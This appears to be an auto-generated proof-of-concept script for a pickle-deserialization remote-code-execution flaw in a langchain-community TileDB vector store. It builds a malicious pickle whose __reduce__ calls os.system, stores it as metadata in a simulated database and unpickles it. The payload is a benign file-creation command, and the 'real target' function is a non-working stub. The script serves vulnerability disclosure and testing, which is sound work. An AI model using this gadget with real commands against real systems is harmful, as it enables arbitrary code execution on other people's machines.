#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-024
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only TileDB vector store.

Vulnerability: The `process_index_results` function in tiledb.py uses `pickle.loads`
on metadata retrieved from the database without any validation. If an attacker can
control the metadata stored in the database (e.g., via `add_texts` or other ingestion
methods), they can inject a malicious pickle payload that executes arbitrary code
upon deserialization.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle payload that executes a benign command
2. Storing the payload as metadata in the TileDB database
3. Triggering the deserialization via `similarity_search_with_relevance_scores`

WARNING: This is for educational/authorized testing purposes only.
"""

import pickle
import os
import sys
import struct
import numpy as np
from typing import List, Tuple, Optional, Dict, Any
import warnings

# Suppress warnings for cleaner output
warnings.filterwarnings("ignore")

# ============================================================
# Configuration - Modify these as needed
# ============================================================
TARGET_HOST = "localhost"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Benign payload - creates a file to prove RCE
# Change to something harmless for testing
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"

# ============================================================
# Malicious pickle payload generation
# ============================================================

class MaliciousPickle:
    """A class that executes a command when unpickled."""
    
    def __reduce__(self):
        """Return the command to execute during unpickling."""
        import os
        return (os.system, (PAYLOAD_COMMAND,))

def create_malicious_pickle_bytes() -> bytes:
    """
    Create a malicious pickle payload that executes a command.
    
    Returns:
        bytes: The pickle payload as bytes
    """
    payload = MaliciousPickle()
    return pickle.dumps(payload)

def pickle_to_tiledb_format(pickle_bytes: bytes) -> np.ndarray:
    """
    Convert pickle bytes to the format expected by TileDB.
    
    TileDB stores metadata as uint8 numpy arrays, so we need to
    convert our pickle bytes to that format.
    
    Args:
        pickle_bytes: The pickle payload as bytes
        
    Returns:
        np.ndarray: The payload as a uint8 numpy array
    """
    # Convert bytes to list of integers (0-255)
    byte_list = list(pickle_bytes)
    # Create numpy array with uint8 dtype
    return np.array(byte_list, dtype=np.uint8)

def create_malicious_metadata() -> np.ndarray:
    """
    Create malicious metadata in TileDB-compatible format.
    
    Returns:
        np.ndarray: Malicious metadata as uint8 numpy array
    """
    pickle_bytes = create_malicious_pickle_bytes()
    return pickle_to_tiledb_format(pickle_bytes)

# ============================================================
# Simulated TileDB interaction (for demonstration)
# ============================================================

class SimulatedTileDB:
    """
    Simulates the TileDB vector store for demonstration purposes.
    
    In a real attack, this would be the actual TileDB database.
    """
    
    def __init__(self):
        """Initialize the simulated database."""
        self.documents = []
        self.metadata = []
    
    def add_texts(
        self,
        texts: List[str],
        metadatas: Optional[List[Dict[str, Any]]] = None,
        **kwargs
    ) -> List[str]:
        """
        Simulate adding texts with metadata to the database.
        
        Args:
            texts: List of text strings to add
            metadatas: Optional list of metadata dictionaries
            
        Returns:
            List[str]: List of document IDs
        """
        ids = []
        for i, text in enumerate(texts):
            doc_id = f"doc_{len(self.documents)}"
            self.documents.append({
                "id": doc_id,
                "text": text,
                "metadata": metadatas[i] if metadatas else {}
            })
            ids.append(doc_id)
        return ids
    
    def search(self, query: str, k: int = 4) -> List[Dict]:
        """
        Simulate a search that returns documents with metadata.
        
        Args:
            query: Search query
            k: Number of results to return
            
        Returns:
            List[Dict]: List of document dictionaries
        """
        # In a real scenario, this would perform actual search
        # For PoC, we return all documents
        return self.documents[:k]

# ============================================================
# Exploit demonstration
# ============================================================

def demonstrate_exploit():
    """
    Demonstrate the pickle deserialization vulnerability.
    
    This function:
    1. Creates a malicious pickle payload
    2. Stores it as metadata in the simulated database
    3. Triggers deserialization by reading the metadata
    """
    print("[*] Starting exploit demonstration...")
    print(f"[*] Target command: {PAYLOAD_COMMAND}")
    
    # Step 1: Create malicious payload
    print("[*] Creating malicious pickle payload...")
    malicious_metadata = create_malicious_metadata()
    print(f"[+] Malicious payload created ({len(malicious_metadata)} bytes)")
    
    # Step 2: Simulate storing the payload in the database
    print("[*] Simulating storage of malicious metadata in database...")
    db = SimulatedTileDB()
    
    # Store a document with malicious metadata
    doc_id = db.add_texts(
        texts=["This is a test document"],
        metadatas=[{"malicious": malicious_metadata.tolist()}]
    )
    print(f"[+] Document stored with ID: {doc_id}")
    
    # Step 3: Demonstrate the vulnerability
    print("[*] Demonstrating deserialization vulnerability...")
    print("[*] When the metadata is retrieved and unpickled, the command executes...")
    
    # This simulates what happens in process_index_results
    # The metadata is stored as bytes, then unpickled
    stored_doc = db.search("test")[0]
    stored_metadata = stored_doc["metadata"]
    
    # In the real vulnerability, this is what happens:
    # metadata = pickle.loads(np.array(pickled_metadata.tolist()).astype(np.uint8).tobytes())
    
    # For demonstration, we directly unpickle the malicious payload
    print("[!] Triggering deserialization...")
    try:
        # Convert the stored metadata back to bytes and unpickle
        metadata_bytes = np.array(stored_metadata["malicious"], dtype=np.uint8).tobytes()
        unpickled = pickle.loads(metadata_bytes)
        print(f"[+] Deserialization completed successfully")
        print(f"[+] Unpickled result: {unpickled}")
    except Exception as e:
        print(f"[!] Error during deserialization: {e}")
    
    # Check if the command was executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Command was executed!")
        print("[+] File /tmp/poc_success.txt was created")
        # Clean up
        os.remove("/tmp/poc_success.txt")
    else:
        print("[!] Command may not have executed (check permissions)")

# ============================================================
# Real-world exploitation example (requires actual TileDB)
# ============================================================

def exploit_real_tiledb(
    tiledb_uri: str,
    query: str = "test",
    k: int = 4
):
    """
    Attempt to exploit a real TileDB instance.
    
    NOTE: This requires the actual TileDB library and a running instance.
    This is provided as a template for authorized testing.
    
    Args:
        tiledb_uri: URI of the TileDB database
        query: Search query to trigger the vulnerability
        k: Number of results to retrieve
    """
    print(f"[*] Attempting to exploit TileDB at {tiledb_uri}")
    
    try:
        # This would require the actual tiledb library
        # import tiledb
        
        # Step 1: Create malicious payload
        malicious_metadata = create_malicious_metadata()
        
        # Step 2: Store the payload (requires write access)
        # In a real scenario, this would be done via add_texts or similar
        print("[*] Would store malicious metadata in database...")
        
        # Step 3: Trigger deserialization via search
        print("[*] Would trigger search to unpickle metadata...")
        
        print("[!] This is a template - actual exploitation requires")
        print("[!] write access to the TileDB database")
        
    except ImportError:
        print("[!] TileDB library not available for real exploitation")
        print("[!] Using simulated demonstration instead")
        demonstrate_exploit()

# ============================================================
# Main execution
# ============================================================

def main():
    """Main function to run the exploit demonstration."""
    print("=" * 60)
    print("TileDB Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Parse command line arguments (optional)
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print("Usage: python poc.py [tiledb_uri]")
            print()
            print("If no URI is provided, a simulated demonstration is shown.")
            print("For real exploitation, provide the TileDB URI and ensure")
            print("the tiledb library is installed.")
            sys.exit(0)
        
        # Attempt real exploitation
        tiledb_uri = sys.argv[1]
        exploit_real_tiledb(tiledb_uri)
    else:
        # Run simulated demonstration
        demonstrate_exploit()
    
    print()
    print("=" * 60)
    print("Exploit demonstration complete")
    print("=" * 60)

if __name__ == "__main__":
    main()
